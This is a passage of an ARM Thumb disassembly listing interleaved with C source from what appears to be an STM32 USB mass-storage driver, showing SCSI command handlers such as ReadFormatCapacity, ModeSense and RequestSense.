 8009f2c:	69bb      	ldr	r3, [r7, #24]
 8009f2e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f32:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f36:	141b      	asrs	r3, r3, #16
 8009f38:	b2da      	uxtb	r2, r3
 8009f3a:	69bb      	ldr	r3, [r7, #24]
 8009f3c:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009f3e:	69bb      	ldr	r3, [r7, #24]
 8009f40:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f44:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f48:	0a1b      	lsrs	r3, r3, #8
 8009f4a:	b29b      	uxth	r3, r3
 8009f4c:	b2da      	uxtb	r2, r3
 8009f4e:	69bb      	ldr	r3, [r7, #24]
 8009f50:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 8009f52:	69bb      	ldr	r3, [r7, #24]
 8009f54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f58:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f5c:	b2da      	uxtb	r2, r3
 8009f5e:	69bb      	ldr	r3, [r7, #24]
 8009f60:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f62:	687b      	ldr	r3, [r7, #4]
 8009f64:	330a      	adds	r3, #10
 8009f66:	781b      	ldrb	r3, [r3, #0]
 8009f68:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009f6a:	687b      	ldr	r3, [r7, #4]
 8009f6c:	330b      	adds	r3, #11
 8009f6e:	781b      	ldrb	r3, [r3, #0]
 8009f70:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f72:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009f74:	687b      	ldr	r3, [r7, #4]
 8009f76:	330c      	adds	r3, #12
 8009f78:	781b      	ldrb	r3, [r3, #0]
 8009f7a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009f7c:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009f7e:	687a      	ldr	r2, [r7, #4]
 8009f80:	320d      	adds	r2, #13
 8009f82:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009f84:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f86:	69bb      	ldr	r3, [r7, #24]
 8009f88:	60da      	str	r2, [r3, #12]

  return 0;
 8009f8a:	2300      	movs	r3, #0
}
 8009f8c:	4618      	mov	r0, r3
 8009f8e:	3724      	adds	r7, #36	; 0x24
 8009f90:	46bd      	mov	sp, r7
 8009f92:	bd90      	pop	{r4, r7, pc}

08009f94 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f94:	b580      	push	{r7, lr}
 8009f96:	b088      	sub	sp, #32
 8009f98:	af00      	add	r7, sp, #0
 8009f9a:	60f8      	str	r0, [r7, #12]
 8009f9c:	460b      	mov	r3, r1
 8009f9e:	607a      	str	r2, [r7, #4]
 8009fa0:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009fa2:	68fb      	ldr	r3, [r7, #12]
 8009fa4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009fa8:	68fb      	ldr	r3, [r7, #12]
 8009faa:	32b0      	adds	r2, #176	; 0xb0
 8009fac:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009fb0:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009fb2:	69bb      	ldr	r3, [r7, #24]
 8009fb4:	2b00      	cmp	r3, #0
 8009fb6:	d102      	bne.n	8009fbe <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 8009fb8:	f04f 33ff 	mov.w	r3, #4294967295
 8009fbc:	e063      	b.n	800a086 <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 8009fbe:	68fb      	ldr	r3, [r7, #12]
 8009fc0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009fc4:	68fa      	ldr	r2, [r7, #12]
 8009fc6:	33b0      	adds	r3, #176	; 0xb0
 8009fc8:	009b      	lsls	r3, r3, #2
 8009fca:	4413      	add	r3, r2
 8009fcc:	685b      	ldr	r3, [r3, #4]
 8009fce:	685b      	ldr	r3, [r3, #4]
 8009fd0:	f107 0214 	add.w	r2, r7, #20
 8009fd4:	f107 0110 	add.w	r1, r7, #16
 8009fd8:	7af8      	ldrb	r0, [r7, #11]
 8009fda:	4798      	blx	r3
 8009fdc:	4603      	mov	r3, r0
 8009fde:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009fe0:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009fe4:	2b00      	cmp	r3, #0
 8009fe6:	d106      	bne.n	8009ff6 <SCSI_ReadFormatCapacity+0x62>
 8009fe8:	69bb      	ldr	r3, [r7, #24]
 8009fea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fee:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009ff2:	2b02      	cmp	r3, #2
 8009ff4:	d108      	bne.n	800a008 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009ff6:	7af9      	ldrb	r1, [r7, #11]
 8009ff8:	233a      	movs	r3, #58	; 0x3a
 8009ffa:	2202      	movs	r2, #2
 8009ffc:	68f8      	ldr	r0, [r7, #12]
 8009ffe:	f000 f941 	bl	800a284 <SCSI_SenseCode>
    return -1;
 800a002:	f04f 33ff 	mov.w	r3, #4294967295
 800a006:	e03e      	b.n	800a086 <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 800a008:	2300      	movs	r3, #0
 800a00a:	83fb      	strh	r3, [r7, #30]
 800a00c:	e007      	b.n	800a01e <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 800a00e:	8bfb      	ldrh	r3, [r7, #30]
 800a010:	69ba      	ldr	r2, [r7, #24]
 800a012:	4413      	add	r3, r2
 800a014:	2200      	movs	r2, #0
 800a016:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 800a018:	8bfb      	ldrh	r3, [r7, #30]
 800a01a:	3301      	adds	r3, #1
 800a01c:	83fb      	strh	r3, [r7, #30]
 800a01e:	8bfb      	ldrh	r3, [r7, #30]
 800a020:	2b0b      	cmp	r3, #11
 800a022:	d9f4      	bls.n	800a00e <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 800a024:	69bb      	ldr	r3, [r7, #24]
 800a026:	2208      	movs	r2, #8
 800a028:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 800a02a:	693b      	ldr	r3, [r7, #16]
 800a02c:	3b01      	subs	r3, #1
 800a02e:	0e1b      	lsrs	r3, r3, #24
 800a030:	b2da      	uxtb	r2, r3
 800a032:	69bb      	ldr	r3, [r7, #24]
 800a034:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 800a036:	693b      	ldr	r3, [r7, #16]
 800a038:	3b01      	subs	r3, #1
 800a03a:	0c1b      	lsrs	r3, r3, #16
 800a03c:	b2da      	uxtb	r2, r3
 800a03e:	69bb      	ldr	r3, [r7, #24]
 800a040:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 800a042:	693b      	ldr	r3, [r7, #16]
 800a044:	3b01      	subs	r3, #1
 800a046:	0a1b      	lsrs	r3, r3, #8
 800a048:	b2da      	uxtb	r2, r3
 800a04a:	69bb      	ldr	r3, [r7, #24]
 800a04c:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 800a04e:	693b      	ldr	r3, [r7, #16]
 800a050:	b2db      	uxtb	r3, r3
 800a052:	3b01      	subs	r3, #1
 800a054:	b2da      	uxtb	r2, r3
 800a056:	69bb      	ldr	r3, [r7, #24]
 800a058:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 800a05a:	69bb      	ldr	r3, [r7, #24]
 800a05c:	2202      	movs	r2, #2
 800a05e:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 800a060:	8abb      	ldrh	r3, [r7, #20]
 800a062:	141b      	asrs	r3, r3, #16
 800a064:	b2da      	uxtb	r2, r3
 800a066:	69bb      	ldr	r3, [r7, #24]
 800a068:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a06a:	8abb      	ldrh	r3, [r7, #20]
 800a06c:	0a1b      	lsrs	r3, r3, #8
 800a06e:	b29b      	uxth	r3, r3
 800a070:	b2da      	uxtb	r2, r3
 800a072:	69bb      	ldr	r3, [r7, #24]
 800a074:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a076:	8abb      	ldrh	r3, [r7, #20]
 800a078:	b2da      	uxtb	r2, r3
 800a07a:	69bb      	ldr	r3, [r7, #24]
 800a07c:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a07e:	69bb      	ldr	r3, [r7, #24]
 800a080:	220c      	movs	r2, #12
 800a082:	60da      	str	r2, [r3, #12]

  return 0;
 800a084:	2300      	movs	r3, #0
}
 800a086:	4618      	mov	r0, r3
 800a088:	3720      	adds	r7, #32
 800a08a:	46bd      	mov	sp, r7
 800a08c:	bd80      	pop	{r7, pc}
	...

0800a090 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a090:	b580      	push	{r7, lr}
 800a092:	b086      	sub	sp, #24
 800a094:	af00      	add	r7, sp, #0
 800a096:	60f8      	str	r0, [r7, #12]
 800a098:	460b      	mov	r3, r1
 800a09a:	607a      	str	r2, [r7, #4]
 800a09c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a09e:	68fb      	ldr	r3, [r7, #12]
 800a0a0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a0a4:	68fb      	ldr	r3, [r7, #12]
 800a0a6:	32b0      	adds	r2, #176	; 0xb0
 800a0a8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a0ac:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a0ae:	2317      	movs	r3, #23
 800a0b0:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a0b2:	693b      	ldr	r3, [r7, #16]
 800a0b4:	2b00      	cmp	r3, #0
 800a0b6:	d102      	bne.n	800a0be <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a0b8:	f04f 33ff 	mov.w	r3, #4294967295
 800a0bc:	e011      	b.n	800a0e2 <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a0be:	687b      	ldr	r3, [r7, #4]
 800a0c0:	3304      	adds	r3, #4
 800a0c2:	781b      	ldrb	r3, [r3, #0]
 800a0c4:	b29b      	uxth	r3, r3
 800a0c6:	8afa      	ldrh	r2, [r7, #22]
 800a0c8:	429a      	cmp	r2, r3
 800a0ca:	d303      	bcc.n	800a0d4 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a0cc:	687b      	ldr	r3, [r7, #4]
 800a0ce:	3304      	adds	r3, #4
 800a0d0:	781b      	ldrb	r3, [r3, #0]
 800a0d2:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a0d4:	8afb      	ldrh	r3, [r7, #22]
 800a0d6:	461a      	mov	r2, r3
 800a0d8:	4904      	ldr	r1, [pc, #16]	; (800a0ec <SCSI_ModeSense6+0x5c>)
 800a0da:	6938      	ldr	r0, [r7, #16]
 800a0dc:	f000 feb8 	bl	800ae50 <SCSI_UpdateBotData>

  return 0;
 800a0e0:	2300      	movs	r3, #0
}
 800a0e2:	4618      	mov	r0, r3
 800a0e4:	3718      	adds	r7, #24
 800a0e6:	46bd      	mov	sp, r7
 800a0e8:	bd80      	pop	{r7, pc}
 800a0ea:	bf00      	nop
 800a0ec:	2000011c 	.word	0x2000011c

0800a0f0 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a0f0:	b580      	push	{r7, lr}
 800a0f2:	b086      	sub	sp, #24
 800a0f4:	af00      	add	r7, sp, #0
 800a0f6:	60f8      	str	r0, [r7, #12]
 800a0f8:	460b      	mov	r3, r1
 800a0fa:	607a      	str	r2, [r7, #4]
 800a0fc:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a0fe:	68fb      	ldr	r3, [r7, #12]
 800a100:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a104:	68fb      	ldr	r3, [r7, #12]
 800a106:	32b0      	adds	r2, #176	; 0xb0
 800a108:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a10c:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a10e:	231b      	movs	r3, #27
 800a110:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a112:	693b      	ldr	r3, [r7, #16]
 800a114:	2b00      	cmp	r3, #0
 800a116:	d102      	bne.n	800a11e <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a118:	f04f 33ff 	mov.w	r3, #4294967295
 800a11c:	e011      	b.n	800a142 <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a11e:	687b      	ldr	r3, [r7, #4]
 800a120:	3308      	adds	r3, #8
 800a122:	781b      	ldrb	r3, [r3, #0]
 800a124:	b29b      	uxth	r3, r3
 800a126:	8afa      	ldrh	r2, [r7, #22]
 800a128:	429a      	cmp	r2, r3
 800a12a:	d303      	bcc.n	800a134 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a12c:	687b      	ldr	r3, [r7, #4]
 800a12e:	3308      	adds	r3, #8
 800a130:	781b      	ldrb	r3, [r3, #0]
 800a132:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a134:	8afb      	ldrh	r3, [r7, #22]
 800a136:	461a      	mov	r2, r3
 800a138:	4904      	ldr	r1, [pc, #16]	; (800a14c <SCSI_ModeSense10+0x5c>)
 800a13a:	6938      	ldr	r0, [r7, #16]
 800a13c:	f000 fe88 	bl	800ae50 <SCSI_UpdateBotData>

  return 0;
 800a140:	2300      	movs	r3, #0
}
 800a142:	4618      	mov	r0, r3
 800a144:	3718      	adds	r7, #24
 800a146:	46bd      	mov	sp, r7
 800a148:	bd80      	pop	{r7, pc}
 800a14a:	bf00      	nop
 800a14c:	20000134 	.word	0x20000134

0800a150 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a150:	b580      	push	{r7, lr}
 800a152:	b086      	sub	sp, #24
 800a154:	af00      	add	r7, sp, #0
 800a156:	60f8      	str	r0, [r7, #12]
 800a158:	460b      	mov	r3, r1
 800a15a:	607a      	str	r2, [r7, #4]
 800a15c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a15e:	68fb      	ldr	r3, [r7, #12]
 800a160:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a164:	68fb      	ldr	r3, [r7, #12]
 800a166:	32b0      	adds	r2, #176	; 0xb0
 800a168:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a16c:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a16e:	693b      	ldr	r3, [r7, #16]
 800a170:	2b00      	cmp	r3, #0
 800a172:	d102      	bne.n	800a17a <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a174:	f04f 33ff 	mov.w	r3, #4294967295
 800a178:	e080      	b.n	800a27c <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a17a:	693b      	ldr	r3, [r7, #16]
 800a17c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a180:	699b      	ldr	r3, [r3, #24]
 800a182:	2b00      	cmp	r3, #0
 800a184:	d10b      	bne.n	800a19e <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a186:	693b      	ldr	r3, [r7, #16]
 800a188:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a18c:	7f59      	ldrb	r1, [r3, #29]
 800a18e:	2320      	movs	r3, #32
 800a190:	2205      	movs	r2, #5
 800a192:	68f8      	ldr	r0, [r7, #12]
 800a194:	f000 f876 	bl	800a284 <SCSI_SenseCode>
    return -1;
 800a198:	f04f 33ff 	mov.w	r3, #4294967295
 800a19c:	e06e      	b.n	800a27c <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a19e:	2300      	movs	r3, #0
 800a1a0:	75fb      	strb	r3, [r7, #23]
 800a1a2:	e007      	b.n	800a1b4 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a1a4:	7dfb      	ldrb	r3, [r7, #23]
 800a1a6:	693a      	ldr	r2, [r7, #16]
 800a1a8:	4413      	add	r3, r2
 800a1aa:	2200      	movs	r2, #0
 800a1ac:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a1ae:	7dfb      	ldrb	r3, [r7, #23]
 800a1b0:	3301      	adds	r3, #1
 800a1b2:	75fb      	strb	r3, [r7, #23]
 800a1b4:	7dfb      	ldrb	r3, [r7, #23]
 800a1b6:	2b11      	cmp	r3, #17
 800a1b8:	d9f4      	bls.n	800a1a4 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a1ba:	693b      	ldr	r3, [r7, #16]
 800a1bc:	2270      	movs	r2, #112	; 0x70
 800a1be:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a1c0:	693b      	ldr	r3, [r7, #16]
 800a1c2:	220c      	movs	r2, #12
 800a1c4:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a1c6:	693b      	ldr	r3, [r7, #16]
 800a1c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1cc:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a1d0:	693b      	ldr	r3, [r7, #16]
 800a1d2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1d6:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a1da:	429a      	cmp	r2, r3
 800a1dc:	d03f      	beq.n	800a25e <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a1de:	693b      	ldr	r3, [r7, #16]
 800a1e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1e4:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1e8:	461a      	mov	r2, r3
 800a1ea:	693b      	ldr	r3, [r7, #16]
 800a1ec:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a1f0:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a1f4:	693b      	ldr	r3, [r7, #16]
 800a1f6:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a1f8:	693b      	ldr	r3, [r7, #16]
 800a1fa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1fe:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a202:	693a      	ldr	r2, [r7, #16]
 800a204:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a208:	00db      	lsls	r3, r3, #3
 800a20a:	4413      	add	r3, r2
 800a20c:	791a      	ldrb	r2, [r3, #4]
 800a20e:	693b      	ldr	r3, [r7, #16]
 800a210:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a212:	693b      	ldr	r3, [r7, #16]
 800a214:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a218:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a21c:	693a      	ldr	r2, [r7, #16]
 800a21e:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a222:	00db      	lsls	r3, r3, #3
 800a224:	4413      	add	r3, r2
 800a226:	795a      	ldrb	r2, [r3, #5]
 800a228:	693b      	ldr	r3, [r7, #16]
 800a22a:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a22c:	693b      	ldr	r3, [r7, #16]
 800a22e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a232:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a236:	3301      	adds	r3, #1
 800a238:	b2da      	uxtb	r2, r3
 800a23a:	693b      	ldr	r3, [r7, #16]
 800a23c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a240:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a244:	693b      	ldr	r3, [r7, #16]
 800a246:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a24a:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a24e:	2b04      	cmp	r3, #4
 800a250:	d105      	bne.n	800a25e <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a252:	693b      	ldr	r3, [r7, #16]
 800a254:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a258:	2200      	movs	r2, #0
 800a25a:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a25e:	693b      	ldr	r3, [r7, #16]
 800a260:	2212      	movs	r2, #18
 800a262:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a264:	687b      	ldr	r3, [r7, #4]
 800a266:	3304      	adds	r3, #4
 800a268:	781b      	ldrb	r3, [r3, #0]
 800a26a:	2b12      	cmp	r3, #18
 800a26c:	d805      	bhi.n	800a27a <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a26e:	687b      	ldr	r3, [r7, #4]
 800a270:	3304      	adds	r3, #4
 800a272:	781b      	ldrb	r3, [r3, #0]
 800a274:	461a      	mov	r2, r3
 800a276:	693b      	ldr	r3, [r7, #16]
 800a278:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a27a:	2300      	movs	r3, #0
}
 800a27c:	4618      	mov	r0, r3
 800a27e:	3718      	adds	r7, #24
 800a280:	46bd      	mov	sp, r7
 800a282:	bd80      	pop	{r7, pc}

0800a284 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a284:	b480      	push	{r7}
 800a286:	b085      	sub	sp, #20
 800a288:	af00      	add	r7, sp, #0
 800a28a:	6078      	str	r0, [r7, #4]
 800a28c:	4608      	mov	r0, r1
 800a28e:	4611      	mov	r1, r2
 800a290:	461a      	mov	r2, r3
 800a292:	4603      	mov	r3, r0
 800a294:	70fb      	strb	r3, [r7, #3]
 800a296:	460b      	mov	r3, r1
 800a298:	70bb      	strb	r3, [r7, #2]
 800a29a:	4613      	mov	r3, r2
 800a29c:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a29e:	687b      	ldr	r3, [r7, #4]
 800a2a0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2a4:	687b      	ldr	r3, [r7, #4]
 800a2a6:	32b0      	adds	r2, #176	; 0xb0
 800a2a8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2ac:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a2ae:	68fb      	ldr	r3, [r7, #12]
 800a2b0:	2b00      	cmp	r3, #0
 800a2b2:	d03d      	beq.n	800a330 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a2b4:	68fb      	ldr	r3, [r7, #12]
 800a2b6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2ba:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2be:	461a      	mov	r2, r3
 800a2c0:	68fb      	ldr	r3, [r7, #12]
 800a2c2:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a2c6:	78b9      	ldrb	r1, [r7, #2]
 800a2c8:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a2cc:	68fb      	ldr	r3, [r7, #12]
 800a2ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2d2:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2d6:	68fa      	ldr	r2, [r7, #12]
 800a2d8:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a2dc:	00db      	lsls	r3, r3, #3
 800a2de:	4413      	add	r3, r2
 800a2e0:	787a      	ldrb	r2, [r7, #1]
 800a2e2:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a2e4:	68fb      	ldr	r3, [r7, #12]
 800a2e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2ea:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2ee:	68fa      	ldr	r2, [r7, #12]
 800a2f0:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a2f4:	00db      	lsls	r3, r3, #3
 800a2f6:	4413      	add	r3, r2
 800a2f8:	2200      	movs	r2, #0
 800a2fa:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a2fc:	68fb      	ldr	r3, [r7, #12]
 800a2fe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a302:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a306:	3301      	adds	r3, #1
 800a308:	b2da      	uxtb	r2, r3
 800a30a:	68fb      	ldr	r3, [r7, #12]
 800a30c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a310:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a314:	68fb      	ldr	r3, [r7, #12]
 800a316:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a31a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a31e:	2b04      	cmp	r3, #4
 800a320:	d107      	bne.n	800a332 <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a322:	68fb      	ldr	r3, [r7, #12]
 800a324:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a328:	2200      	movs	r2, #0
 800a32a:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a32e:	e000      	b.n	800a332 <SCSI_SenseCode+0xae>
    return;
 800a330:	bf00      	nop
  }
}
 800a332:	3714      	adds	r7, #20
 800a334:	46bd      	mov	sp, r7
 800a336:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a33a:	4770      	bx	lr

0800a33c <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
